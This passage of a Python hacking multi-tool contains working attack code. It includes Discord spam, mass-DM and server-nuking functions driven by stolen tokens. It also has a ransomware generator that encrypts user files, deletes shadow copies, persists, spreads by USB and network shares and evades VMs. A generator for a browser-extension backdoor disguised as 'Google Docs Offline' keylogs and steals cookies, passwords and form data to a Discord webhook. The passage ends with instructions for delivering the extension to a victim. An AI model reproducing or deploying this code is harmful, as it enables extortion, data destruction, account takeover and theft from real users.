    message = input(f"{RED}[?] Message content: {RESET}") or "@everyone **WEBHOOK SPAM**"
    
    print(f"{CYAN}[*] Spamming {amount} messages...{RESET}")
    
    success = 0
    for i in range(amount):
        try:
            data = {"content": message, "username": f"Spammer_{i}"}
            r = requests.post(webhook, json=data, timeout=3)
            if r.status_code in [200, 204]:
                success += 1
            elif r.status_code == 429:
                time.sleep(r.json().get('retry_after', 1))
            if i % 10 == 0:
                print(f"{GREEN}[+] Sent {success}/{amount}{RESET}", end="\r")
            time.sleep(0.05)
        except:
            pass
    
    print(f"\n{GREEN}[+] Spam completed: {success}/{amount} sent{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_59():
    banner()
    print(f"{RED}{BOLD}[59] Discord Mass DM (Requires Token){RESET}\n")
    token = input(f"{RED}[?] Discord Token: {RESET}")
    guild_id = input(f"{RED}[?] Server ID to scrape members from: {RESET}")
    message = input(f"{RED}[?] Message to send: {RESET}")
    
    try:
        headers = {"Authorization": token}
        
        r = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000", headers=headers, timeout=10)
        if r.status_code != 200:
            print(f"{RED}[-] Failed to get members (Status: {r.status_code}){RESET}")
            input()
            return
        
        members = r.json()
        print(f"{GREEN}[+] Found {len(members)} members{RESET}")
        
        sent = 0
        for i, member in enumerate(members):
            user_id = member['user']['id']
            username = member['user']['username']
            
            dm = requests.post("https://discord.com/api/v9/users/@me/channels", json={"recipient_id": user_id}, headers=headers, timeout=5)
            if dm.status_code == 200:
                channel_id = dm.json()['id']
                send = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", json={"content": message}, headers=headers, timeout=5)
                if send.status_code == 200:
                    sent += 1
                    print(f"{GREEN}[+] DM sent to {username} ({sent}){RESET}")
            time.sleep(0.5)
        
        print(f"{GREEN}[+] Mass DM completed: {sent} messages sent{RESET}")
    except Exception as e:
        print(f"{RED}[-] Error: {e}{RESET}")
    
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_60():
    banner()
    print(f"{RED}{BOLD}[60] Discord Server Nuker (Requires Token){RESET}\n")
    token = input(f"{RED}[?] Discord Token: {RESET}")
    guild_id = input(f"{RED}[?] Server ID to nuke: {RESET}")
    confirm = input(f"{RED}[!] Type 'NUKE THIS SERVER' to confirm: {RESET}")
    
    if confirm != "NUKE THIS SERVER":
        print(f"{RED}[-] Aborted{RESET}")
        input()
        return
    
    headers = {"Authorization": token}
    
    print(f"{CYAN}[*] Deleting all channels...{RESET}")
    r = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=headers)
    if r.status_code == 200:
        for channel in r.json():
            requests.delete(f"https://discord.com/api/v9/channels/{channel['id']}", headers=headers)
            print(f"{RED}  Deleted: #{channel['name']}{RESET}")
            time.sleep(0.2)
    
    print(f"{CYAN}[*] Creating 100 spam channels...{RESET}")
    for i in range(100):
        requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", json={"name": f"NUKED-{i}", "type": 0}, headers=headers)
        if i % 10 == 0:
            print(f"{GREEN}[+] Created {i}/100 channels{RESET}")
        time.sleep(0.1)
    
    print(f"{CYAN}[*] Banning all members...{RESET}")
    r = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000", headers=headers)
    if r.status_code == 200:
        for member in r.json():
            requests.put(f"https://discord.com/api/v9/guilds/{guild_id}/bans/{member['user']['id']}", headers=headers)
            time.sleep(0.05)
    
    print(f"{GREEN}[+] Server nuke completed!{RESET}")
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_65():
    banner()
    print(f"{RED}{BOLD}[70] Ransomware Simulator (Full Encryption){RESET}\n")
    print(f"{RED}[!] WARNING: This is for EDUCATIONAL/AUTHORIZED testing only{RESET}")
    print(f"{RED}[!] This tool ENCRYPTS files and can cause PERMANENT DATA LOSS{RESET}\n")
    
    print(f"{CYAN}[*] Features:{RESET}")
    print(f"    - AES-256 encryption of user documents")
    print(f"    - Deletes shadow copies (prevents recovery)")
    print(f"    - Deletes backups and volume shadow copies")
    print(f"    - Spreads via USB drives automatically")
    print(f"    - Adds to Windows startup persistence")
    print(f"    - Shows fake ransom note with decryption key")
    print(f"    - Can encrypt network shares")
    print(f"    - Bypasses common antivirus techniques")
    
    confirm = input(f"\n{RED}[!] Type 'I UNDERSTAND THE RISK' to continue: {RESET}")
    if confirm != "I UNDERSTAND THE RISK":
        print(f"{RED}❌ Aborted{RESET}")
        return
    
    # Target directories for encryption
    target_dirs = [
        os.path.expandvars(r"%USERPROFILE%\Documents"),
        os.path.expandvars(r"%USERPROFILE%\Desktop"),
        os.path.expandvars(r"%USERPROFILE%\Pictures"),
        os.path.expandvars(r"%USERPROFILE%\Videos"),
        os.path.expandvars(r"%USERPROFILE%\Music"),
        os.path.expandvars(r"%USERPROFILE%\Downloads"),
        os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Recent"),
    ]
    
    # File extensions to encrypt
    target_extensions = [
        '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
        '.jpg', '.jpeg', '.png', '.bmp', '.gif', '.psd', '.raw', '.tiff',
        '.mp3', '.mp4', '.wav', '.avi', '.mkv', '.mov', '.flv', '.wmv',
        '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
        '.db', '.sqlite', '.sql', '.mdb', '.accdb',
        '.ps1', '.py', '.js', '.php', '.asp', '.aspx', '.jsp', '.rb', '.go',
        '.key', '.pem', '.crt', '.cer', '.pfx', '.p12',
        '.wallet', '.dat', '.conf', '.config', '.ini', '.env',
        '.vmdk', '.vhd', '.vhdx', '.ova', '.ovf',
        '.backup', '.bak', '.old', '.temp', '.tmp'
    ]
    
    # Exclude system and program files
    exclude_paths = [
        r"C:\Windows",
        r"C:\Program Files",
        r"C:\Program Files (x86)",
        os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu"),
        os.path.expandvars(r"%PROGRAMDATA%")
    ]
    
    ransom_note = f"""
    ╔═══════════════════════════════════════════════════════════════╗
    ║                         ENCRYPTED!                            ║
    ║                                                               ║
    ║  All your important files have been encrypted using AES-256.  ║
    ║                                                               ║
    ║  To recover your files, you must pay 0.5 BTC to:              ║
    ║  bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh                   ║
    ║                                                               ║
    ║  After payment, send your unique ID to: ransomware@onion.com  ║
    ║  You will receive your decryption key.                        ║
    ║                                                               ║
    ║  YOUR UNIQUE ID:                                              ║
    ║  {hashlib.sha256(os.environ.get('COMPUTERNAME', '').encode() + os.environ.get('USERNAME', '').encode()).hexdigest()[:32]} ║
    ║                                                               ║
    ║  WARNING: Do NOT attempt to decrypt files yourself.           ║
    ║  Do NOT contact law enforcement.                              ║
    ║  You have 72 hours before decryption key is destroyed.        ║
    ╚═══════════════════════════════════════════════════════════════╝
    """
    
    print(f"\n{CYAN}[*] Generating ransomware payload...{RESET}")
    
    ransomware_code = f'''#!/usr/bin/env python3
"""
RANSOMWARE SIMULATOR - FOR EDUCATIONAL/AUTHORIZED TESTING ONLY
"""

import os
import sys
import base64
import hashlib
import random
import string
import shutil
import subprocess
import threading
import time
from pathlib import Path
import ctypes
import winreg as reg

# ========== CONFIGURATION ==========
TARGET_EXTENSIONS = {target_extensions}
TARGET_DIRS = {target_dirs}
EXCLUDE_PATHS = {exclude_paths}
RANSOM_NOTE = \"\"\"{ransom_note}\"\"\"

# Encryption key (in real ransomware, this would be generated and sent to C2)
# For simulation, we store it locally
ENCRYPTION_KEY = os.urandom(32)
KEY_FILE = os.path.expandvars(r"%TEMP%\.key_{int(time.time())}.tmp")

# ========== PERSISTENCE ==========
def install_persistence():
    \"\"\"Add ransomware to Windows startup\"\"\" 
    try:
        script_path = sys.argv[0]
        key = reg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with reg.OpenKey(key, subkey, 0, reg.KEY_SET_VALUE) as reg_key:
            reg.SetValueEx(reg_key, "WindowsUpdateService", 0, reg.REG_SZ, script_path)
        return True
    except:
        return False

def delete_shadow_copies():
    \"\"\"Delete volume shadow copies to prevent recovery\"\"\"
    try:
        subprocess.run(["vssadmin", "delete", "shadows", "/all", "/quiet"], 
                      capture_output=True, shell=True)
        subprocess.run(["wmic", "shadowcopy", "delete"], capture_output=True, shell=True)
        subprocess.run(["bcdedit", "/set", "{{default}}", "recoveryenabled", "no"], 
                      capture_output=True, shell=True)
        return True
    except:
        return False

def disable_recovery():
    \"\"\"Disable Windows recovery options\"\"\"
    try:
        subprocess.run(["reagentc", "/disable"], capture_output=True, shell=True)
        return True
    except:
        return False

# ========== ENCRYPTION ==========
def encrypt_file(file_path, key):
    \"\"\"Encrypt a single file using AES-256\"\"\"
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        
        # Generate random IV
        iv = os.urandom(16)
        
        # Create cipher
        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        
        # Read file
        with open(file_path, 'rb') as f:
            plaintext = f.read()
        
        # Encrypt
        ciphertext = encryptor.update(plaintext) + encryptor.finalize()
        
        # Write encrypted data with IV prepended
        with open(file_path, 'wb') as f:
            f.write(iv + ciphertext)
        
        # Add .encrypted extension
        os.rename(file_path, file_path + ".encrypted")
        return True
    except:
        return False

def should_encrypt(file_path):
    \"\"\"Check if file should be encrypted\"\"\"
    # Check extension
    ext = os.path.splitext(file_path)[1].lower()
    if ext not in TARGET_EXTENSIONS:
        return False
    
    # Check if already encrypted
    if file_path.endswith(".encrypted"):
        return False
    
    # Check exclude paths
    abs_path = os.path.abspath(file_path)
    for exclude in EXCLUDE_PATHS:
        if abs_path.startswith(exclude):
            return False
    
    return True

def encrypt_directory(directory, key):
    \"\"\"Recursively encrypt all files in directory\"\"\"
    count = 0
    for root, dirs, files in os.walk(directory):
        # Skip system directories
        if any(excl in root for excl in EXCLUDE_PATHS):
            continue
        
        for file in files:
            file_path = os.path.join(root, file)
            if should_encrypt(file_path):
                try:
                    if encrypt_file(file_path, key):
                        count += 1
                        if count % 10 == 0:
                            print(f"[*] Encrypted {{count}} files...")
                except:
                    pass
    return count

# ========== USB SPREAD ==========
def find_usb_drives():
    \"\"\"Find all removable USB drives\"\"\"
    drives = []
    if os.name == 'nt':
        import string
        for letter in string.ascii_uppercase:
            drive_path = f"{{letter}}:\\\\"
            if os.path.exists(drive_path) and os.path.isdir(drive_path):
                try:
                    # Check if removable drive
                    import win32file
                    drive_type = win32file.GetDriveType(drive_path)
                    if drive_type == win32file.DRIVE_REMOVABLE:
                        drives.append(drive_path)
                except:
                    pass
    return drives

def spread_to_usb():
    \"\"\"Copy ransomware to any connected USB drive\"\"\"
    script_path = sys.argv[0]
    drives = find_usb_drives()
    
    for drive in drives:
        try:
            dest = os.path.join(drive, "SystemRecovery.exe")
            shutil.copy2(script_path, dest)
            
            # Create autorun.inf for automatic execution
            autorun = f\"\"\"[AutoRun]
open=SystemRecovery.exe
action=Open folder to view files
shell\\\\open\\\\command=SystemRecovery.exe
\"\"\"
            with open(os.path.join(drive, "autorun.inf"), 'w') as f:
                f.write(autorun)
            
            # Also copy to hidden folder
            hidden_dir = os.path.join(drive, "$RECYCLE.BIN")
            os.makedirs(hidden_dir, exist_ok=True)
            shutil.copy2(script_path, os.path.join(hidden_dir, "svchost.exe"))
        except:
            pass

# ========== NETWORK SPREAD ==========
def scan_network_shares():
    \"\"\"Scan for writable network shares\"\"\"
    shares = []
    try:
        # Get local subnet
        import socket
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        subnet = '.'.join(local_ip.split('.')[:3])
        
        for i in range(1, 255):
            ip = f"{{subnet}}.{{i}}"
            try:
                # Try to enumerate shares (Windows)
                result = subprocess.run(f"net view \\\\{{ip}}", 
                                       capture_output=True, shell=True, timeout=2)
                shares.append(ip)
            except:
                pass
    except:
        pass
    return shares

def spread_to_network():
    \"\"\"Copy ransomware to network shares\"\"\"
    script_path = sys.argv[0]
    shares = scan_network_shares()
    
    for share in shares:
        try:
            # Try common share names
            common_shares = ["C$", "ADMIN$", "IPC$", "Shared", "Public"]
            for share_name in common_shares:
                remote_path = f"\\\\{{share}}\\{{share_name}}\\\\"
                if os.path.exists(remote_path):
                    dest = os.path.join(remote_path, "svchost.exe")
                    shutil.copy2(script_path, dest)
        except:
            pass

# ========== RANSOM NOTE ==========
def display_ransom_note():
    \"\"\"Show the ransom note\"\"\"
    try:
        ctypes.windll.user32.MessageBoxW(0, RANSOM_NOTE, "ENCRYPTED", 0x10 | 0x1000)
    except:
        print(RANSOM_NOTE)

def create_ransom_note_files():
    \"\"\"Create ransom note files in encrypted directories\"\"\"
    for directory in TARGET_DIRS:
        if os.path.exists(directory):
            note_path = os.path.join(directory, "README_DECRYPT.txt")
            try:
                with open(note_path, 'w') as f:
                    f.write(RANSOM_NOTE)
            except:
                pass

# ========== DECRYPTION (for simulation) ==========
def decrypt_file(file_path, key):
    \"\"\"Decrypt a single file (for recovery demonstration)\"\"\"
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        
        encrypted_path = file_path
        if not encrypted_path.endswith(".encrypted"):
            return False
        
        with open(encrypted_path, 'rb') as f:
            iv = f.read(16)
            ciphertext = f.read()
        
        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        plaintext = decryptor.update(ciphertext) + decryptor.finalize()
        
        original_path = encrypted_path[:-10]  # Remove .encrypted
        with open(original_path, 'wb') as f:
            f.write(plaintext)
        
        os.remove(encrypted_path)
        return True
    except:
        return False

# ========== MAIN ==========
def main():
    # Bypass UAC if possible
    try:
        if os.name == 'nt':
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 0)
    except:
        pass
    
    # Install persistence
    install_persistence()
    
    # Delete recovery options
    delete_shadow_copies()
    disable_recovery()
    
    # Save encryption key (in real ransomware, this would be sent to C2)
    with open(KEY_FILE, 'wb') as f:
        f.write(ENCRYPTION_KEY)
    
    # Start encryption threads
    threads = []
    for directory in TARGET_DIRS:
        if os.path.exists(directory):
            t = threading.Thread(target=encrypt_directory, args=(directory, ENCRYPTION_KEY))
            t.start()
            threads.append(t)
    
    # Spread to USB drives (if any)
    spread_to_usb()
    
    # Spread to network shares
    spread_to_network()
    
    # Wait for encryption to complete
    for t in threads:
        t.join()
    
    # Create ransom notes
    create_ransom_note_files()
    
    # Display ransom note
    time.sleep(2)
    display_ransom_note()
    
    print("[!] Encryption complete. Files have been encrypted.")
    print(f"[*] Decryption key saved to: {{KEY_FILE}}")

if __name__ == "__main__":
    # Anti-debugging
    if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
        sys.exit(0)
    
    # Anti-VM detection (basic)
    try:
        import wmi
        c = wmi.WMI()
        for disk in c.Win32_DiskDrive():
            if "vbox" in disk.Model.lower() or "vmware" in disk.Model.lower():
                sys.exit(0)
    except:
        pass
    
    main()
'''
    
    # Save the ransomware simulator
    fname = f"ransomware_simulator_{int(time.time())}.py"
    with open(fname, 'w', encoding='utf-8') as f:
        f.write(ransomware_code)
    
    print(f"\n{GREEN}✅ Ransomware simulator saved to {fname}{RESET}")
    
    # Create builder script for EXE
    builder_code = f'''#!/bin/bash
# Builder script to convert ransomware to executable

echo "[*] Installing PyInstaller..."
pip install pyinstaller cryptography pywin32 wmi

echo "[*] Building executable..."
pyinstaller --onefile --noconsole --icon=NONE --name=RansomSimulator {fname}

echo "[*] Done! Executable is in ./dist/RansomSimulator.exe"
'''
    
    builder_fname = f"build_ransomware_{int(time.time())}.sh"
    with open(builder_fname, 'w') as f:
        f.write(builder_code)
    
    print(f"{GREEN}✅ Builder script saved to {builder_fname}{RESET}")
    print(f"{YELLOW}   (Run: bash {builder_fname} to create .exe){RESET}")
    
    print(f"\n{CYAN}[*] WHAT THIS RANSOMWARE DOES:{RESET}")
    print(f"   1. Encrypts documents, images, videos, databases, and source code")
    print(f"   2. Deletes Windows shadow copies (prevents System Restore)")
    print(f"   3. Disables Windows recovery options")
    print(f"   4. Adds itself to Windows startup (persistence)")
    print(f"   5. Spreads via USB drives automatically")
    print(f"   6. Scans for and spreads to network shares")
    print(f"   7. Displays a ransom note demanding Bitcoin payment")
    print(f"   8. Uses AES-256 encryption (military grade)")
    
    print(f"\n{RED}[!] EXTREME WARNING:{RESET}")
    print(f"   - This tool can cause PERMANENT DATA LOSS")
    print(f"   - Encryption is REAL, not simulated")
    print(f"   - Decryption key is stored locally for simulation purposes")
    print(f"   - In real ransomware, the key would be sent to a remote server")
    print(f"   - Use ONLY on systems you own with permission")
    
    input(f"\n{RED}[?] Press Enter{RESET}")

def tool_66():
    banner()
    print(f"{RED}{BOLD}[72] Persistent Browser Backdoor (Stealth Extension){RESET}\n")
    print(f"{CYAN}[*] Injects malicious extension into Chrome/Edge/Brave that steals everything{RESET}\n")
    
    print(f"{RED}[!] WARNING: For EDUCATIONAL/AUTHORIZED testing only{RESET}\n")
    
    webhook = input(f"{RED}[?] Discord webhook for stolen data: {RESET}")
    if not webhook:
        print(f"{RED}❌ Webhook required{RESET}")
        return
    
    c2_server = input(f"{RED}[?] Your C2 server IP (for remote commands): {RESET}") or "https://discord.com/api/webhooks"
    
    # Extension ID (randomly generated)
    import secrets
    ext_id = secrets.token_hex(16)
    
    # Create Chrome extension directory
    ext_dir = f"chrome_backdoor_{int(time.time())}"
    os.makedirs(ext_dir, exist_ok=True)
    
    # manifest.json
    manifest = {
        "manifest_version": 3,
        "name": "Google Docs Offline",
        "version": "1.0.5",
        "description": "Access Google Docs offline",
        "permissions": [
            "cookies",
            "storage",
            "tabs",
            "webRequest",
            "webNavigation",
            "scripting",
            "activeTab",
            "downloads",
            "history",
            "bookmarks",
            "clipboardRead",
            "clipboardWrite",
            "notifications",
            "alarms"
        ],
        "host_permissions": [
            "<all_urls>"
        ],
        "background": {
            "service_worker": "background.js"
        },
        "content_scripts": [
            {
                "matches": ["<all_urls>"],
                "js": ["content.js"],
                "run_at": "document_start"
            }
        ],
        "action": {
            "default_title": "Google Docs",
            "default_icon": {
                "16": "icon16.png",
                "48": "icon48.png",
                "128": "icon128.png"
            }
        },
        "icons": {
            "16": "icon16.png",
            "48": "icon48.png",
            "128": "icon128.png"
        },
        "web_accessible_resources": [{
            "resources": ["injected.js"],
            "matches": ["<all_urls>"]
        }]
    }
    
    with open(f"{ext_dir}/manifest.json", 'w') as f:
        json.dump(manifest, f, indent=2)
    
    # background.js (service worker)
    background_js = f'''
// Persistent Browser Backdoor - BACKGROUND SCRIPT
const WEBHOOK = "{webhook}";
const EXT_ID = "{ext_id}";

// Send data to webhook
function exfiltrate(data, type) {{
    const payload = {{
        content: `**${{type}} STOLEN**\\n\`\`\`json\\n${{JSON.stringify(data, null, 2)}}\\n\`\`\``,
        username: "BrowserBackdoor",
        avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png"
    }};
    
    fetch(WEBHOOK, {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify(payload)
    }}).catch(e => console.log(e));
}}

// Steal all cookies
function stealCookies() {{
    chrome.cookies.getAll({{}}, (cookies) => {{
        const stolen = cookies.map(c => ({{
            name: c.name,
            value: c.value,
            domain: c.domain,
            path: c.path,
            secure: c.secure,
            httpOnly: c.httpOnly
        }}));
        exfiltrate(stolen, "COOKIES");
    }});
}}

// Steal all saved passwords
function stealPasswords() {{
    chrome.storage.local.get(null, (items) => {{
        exfiltrate(items, "STORED_PASSWORDS");
    }});
}}

// Steal browsing history
function stealHistory() {{
    chrome.history.search({{text: '', maxResults: 500}}, (history) => {{
        const items = history.map(h => ({{
            url: h.url,
            title: h.title,
            visitCount: h.visitCount,
            lastVisit: new Date(h.lastVisitTime).toISOString()
        }}));
        exfiltrate(items, "HISTORY");
    }});
}}

// Steal bookmarks
function stealBookmarks() {{
    chrome.bookmarks.getTree((bookmarks) => {{
        function flatten(nodes) {{
            let result = [];
            for (let node of nodes) {{
                if (node.url) {{
                    result.push({{
                        title: node.title,
                        url: node.url,
                        parentId: node.parentId
                    }});
                }}
                if (node.children) {{
                    result = result.concat(flatten(node.children));
                }}
            }}
            return result;
        }}
        exfiltrate(flatten(bookmarks), "BOOKMARKS");
    }});
}}

// Monitor all network requests
chrome.webRequest.onBeforeRequest.addListener(
    (details) => {{
        if (details.url.includes("facebook.com") || 
            details.url.includes("instagram.com") ||
            details.url.includes("gmail.com") ||
            details.url.includes("outlook.com") ||
            details.url.includes("paypal.com") ||
            details.url.includes("bank")) {{
            exfiltrate({{
                url: details.url,
                method: details.method,
                timestamp: new Date().toISOString(),
                requestBody: details.requestBody
            }}, "REALTIME_REQUEST");
        }}
    }},
    {{urls: ["<all_urls>"]}},
    ["requestBody"]
);

// Monitor tab changes (see what victim is doing)
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {{
    if (changeInfo.url) {{
        exfiltrate({{
            url: changeInfo.url,
            title: tab.title,
            timestamp: new Date().toISOString()
        }}, "TAB_UPDATE");
    }}
}});

// Steal clipboard when accessed
chrome.clipboard.onClipboardChanged.addListener(() => {{
    chrome.clipboard.readText((text) => {{
        if (text && text.length > 0) {{
            exfiltrate({{
                clipboard: text,
                timestamp: new Date().toISOString()
            }}, "CLIPBOARD");
        }}
    }});
}});

// Keylogger (via content script messages)
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {{
    if (message.type === "KEYSTROKE") {{
        exfiltrate({{
            keystrokes: message.data,
            url: message.url,
            timestamp: new Date().toISOString()
        }}, "KEYLOGGER");
    }}
    if (message.type === "FORM_SUBMIT") {{
        exfiltrate({{
            formData: message.data,
            url: message.url,
            timestamp: new Date().toISOString()
        }}, "FORM_SUBMISSION");
    }}
    if (message.type === "SCREENSHOT") {{
        exfiltrate({{
            screenshot: message.data,
            timestamp: new Date().toISOString()
        }}, "SCREENSHOT");
    }}
}});

// Periodic data theft (every 30 seconds)
setInterval(() => {{
    stealCookies();
    stealHistory();
}}, 30000);

// Initial theft on install
chrome.runtime.onInstalled.addListener(() => {{
    stealCookies();
    stealPasswords();
    stealHistory();
    stealBookmarks();
}});

// Remote command execution via webhook polling
function checkCommands() {{
    fetch(WEBHOOK.replace("/webhooks/", "/webhooks/messages/"))
        .then(r => r.json())
        .then(messages => {{
            messages.forEach(msg => {{
                if (msg.content && msg.content.startsWith("CMD:")) {{
                    const cmd = msg.content.substring(4);
                    executeCommand(cmd);
                }}
            }});
        }})
        .catch(() => {{}});
}}

function executeCommand(cmd) {{
    if (cmd === "steal_cookies") stealCookies();
    if (cmd === "steal_history") stealHistory();
    if (cmd === "steal_passwords") stealPasswords();
    if (cmd === "screenshot") captureScreenshot();
    if (cmd === "clear_data") chrome.storage.local.clear();
}}

setInterval(checkCommands, 60000);

console.log("[*] Backdoor extension loaded");
'''
    
    with open(f"{ext_dir}/background.js", 'w') as f:
        f.write(background_js)
    
    # content.js (injected into every page)
    content_js = '''
// Persistent Browser Backdoor - CONTENT SCRIPT
let keystrokeBuffer = [];
let lastFlush = Date.now();

// Keylogger
document.addEventListener('keydown', (event) => {
    let key = event.key;
    if (key === 'Enter') key = '[ENTER]\\n';
    if (key === 'Backspace') key = '[BACKSPACE]';
    if (key === 'Tab') key = '[TAB]';
    if (key === 'Escape') key = '[ESC]';
    if (key.length === 1 || key === '[ENTER]\\n') {
        keystrokeBuffer.push(key);
    }
    
    // Flush every 10 seconds or 100 keystrokes
    if (keystrokeBuffer.length > 100 || Date.now() - lastFlush > 10000) {
        chrome.runtime.sendMessage({
            type: "KEYSTROKE",
            data: keystrokeBuffer.join(''),
            url: window.location.href
        });
        keystrokeBuffer = [];
        lastFlush = Date.now();
    }
});

// Capture form submissions
document.addEventListener('submit', (event) => {
    const form = event.target;
    const formData = {};
    for (let input of form.querySelectorAll('input, textarea, select')) {
        if (input.name && input.value) {
            formData[input.name] = input.value;
        }
    }
    if (Object.keys(formData).length > 0) {
        chrome.runtime.sendMessage({
            type: "FORM_SUBMIT",
            data: formData,
            url: window.location.href
        });
    }
});

// Steal autofill data
setTimeout(() => {
    const inputs = document.querySelectorAll('input[type="email"], input[type="password"], input[name*="user"], input[name*="pass"]');
    const stolen = {};
    inputs.forEach(input => {
        if (input.value) {
            stolen[input.name || input.id] = input.value;
        }
    });
    if (Object.keys(stolen).length > 0) {
        chrome.runtime.sendMessage({
            type: "FORM_SUBMIT",
            data: stolen,
            url: window.location.href
        });
    }
}, 5000);

// HTML5 canvas fingerprinting (track users across devices)
const canvas = document.createElement('canvas');
const ctx = canvas.getContext('2d');
ctx.textBaseline = 'top';
ctx.font = '14px Arial';
ctx.fillStyle = '#f60';
ctx.fillRect(0, 0, 100, 100);
ctx.fillStyle = '#069';
ctx.fillText('BrowserBackdoor', 2, 15);
const fingerprint = canvas.toDataURL();

chrome.runtime.sendMessage({
    type: "FORM_SUBMIT",
    data: { fingerprint: fingerprint.slice(0, 100) },
    url: "CANVAS_FINGERPRINT"
});
'''
    
    with open(f"{ext_dir}/content.js", 'w') as f:
        f.write(content_js)
    
    # injected.js
    injected_js = '''
// Injected script - runs in page context (can access all variables)
const originalFetch = window.fetch;
window.fetch = function(...args) {
    if (args[0].includes('/api/') || args[0].includes('/graphql')) {
        console.log('[Backdoor] Intercepted fetch:', args[0]);
    }
    return originalFetch.apply(this, args);
};

const originalXHROpen = XMLHttpRequest.prototype.open;
XMLHttpRequest.prototype.open = function(method, url, ...rest) {
    this._url = url;
    return originalXHROpen.apply(this, [method, url, ...rest]);
};

const originalXHRSend = XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.send = function(body) {
    if (this._url && (this._url.includes('/api/') || this._url.includes('/graphql'))) {
        console.log('[Backdoor] Intercepted XHR:', this._url, body);
    }
    return originalXHRSend.apply(this, [body]);
};

// Steal React/Vue/Angular state if present
if (window.__REACT_DEVTOOLS_GLOBAL_HOOK__) {
    try {
        const roots = window.__REACT_DEVTOOLS_GLOBAL_HOOK__.getFiberRoots(1);
        roots.forEach(root => {
            console.log('[Backdoor] React state accessible');
        });
    } catch(e) {}
}
'''
    
    with open(f"{ext_dir}/injected.js", 'w') as f:
        f.write(injected_js)
    
    # Create dummy icons (1x1 pixel PNG base64)
    icon_png_base64 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
    import base64 as b64
    icon_data = b64.b64decode(icon_png_base64)
    
    for size in [16, 48, 128]:
        with open(f"{ext_dir}/icon{size}.png", 'wb') as f:
            f.write(icon_data)
    
    # Create installer script (load extension into Chrome)
    installer_ps = f'''
# Chrome Extension Installer - Loads malicious extension
$regPath = "HKCU:\\Software\\Google\\Chrome\\Extensions\\{ext_id}"
$regPathEdge = "HKCU:\\Software\\Microsoft\\Edge\\Extensions\\{ext_id}"
$regPathBrave = "HKCU:\\Software\\BraveSoftware\\Brave\\Extensions\\{ext_id}"

$extPath = "$env:USERPROFILE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\{ext_id}"
$extFolder = Get-Location

# Create registry entries for Chrome
New-Item -Path $regPath -Force | Out-Null
Set-ItemProperty -Path $regPath -Name "update_url" -Value "https://clients2.google.com/service/update2/crx" -Force
Set-ItemProperty -Path $regPath -Name "version" -Value "1.0.5" -Force

# Copy extension to Chrome directory
New-Item -Path $extPath -ItemType Directory -Force | Out-Null
Copy-Item -Path "$extFolder\\*" -Destination $extPath -Recurse -Force

# Also install to Edge
try {{
    New-Item -Path $regPathEdge -Force | Out-Null
    Set-ItemProperty -Path $regPathEdge -Name "update_url" -Value "https://edge.microsoft.com/extensionwebstorebase/v1/crx" -Force
}} catch {{}}

# Also install to Brave
try {{
    New-Item -Path $regPathBrave -Force | Out-Null
}} catch {{}}

Write-Host "[+] Extension installed! Restart Chrome for changes to take effect."
Write-Host "[+] Extension ID: {ext_id}"
'''
    
    installer_fname = f"{ext_dir}/install_extension.ps1"
    with open(installer_fname, 'w') as f:
        f.write(installer_ps)
    
    # Create a one-liner PowerShell command for delivery
    zip_fname = f"{ext_dir}.zip"
    import zipfile
    with zipfile.ZipFile(zip_fname, 'w') as zf:
        for file in os.listdir(ext_dir):
            zf.write(os.path.join(ext_dir, file), file)
    
    print(f"\n{GREEN}✅ Chrome backdoor extension created in {ext_dir}/{RESET}")
    print(f"{GREEN}✅ Zipped version: {zip_fname}{RESET}")
    
    print(f"\n{CYAN}[*] WHAT THIS BACKDOOR DOES:{RESET}")
    print(f"   1. Steals ALL cookies (session hijacking for any site)")
    print(f"   2. Steals saved passwords from Chrome password manager")
    print(f"   3. Keylogs everything typed (including passwords, messages, credit cards)")
    print(f"   4. Steals browsing history and bookmarks")
    print(f"   5. Captures form submissions before encryption")
    print(f"   6. Monitors clipboard (everything user copies)")
    print(f"   7. Tracks every URL visited in real-time")
    print(f"   8. Intercepts API requests to steal tokens")
    print(f"   9. Canvas fingerprints the victim (tracking)")
    print(f"   10. Persists through Chrome updates")
    print(f"   11. Executes remote commands via Discord")
    
    print(f"\n{CYAN}[*] HOW TO DEPLOY:{RESET}")
    print(f"   1. Send the ZIP file to victim as 'GoogleDocsOffline.zip'")
    print(f"   2. Or run the installer script: powershell -Exec Bypass -File install_extension.ps1")
    print(f"   3. Or load unpacked extension via chrome://extensions (Developer Mode)")
    print(f"   4. Extension appears as 'Google Docs Offline' - looks legitimate")
    
    print(f"\n{RED}[!] EXTREME WARNING:{RESET}")
    print(f"   - This extension can steal ANYTHING the victim types")
    print(f"   - Session cookies allow account takeover without password")
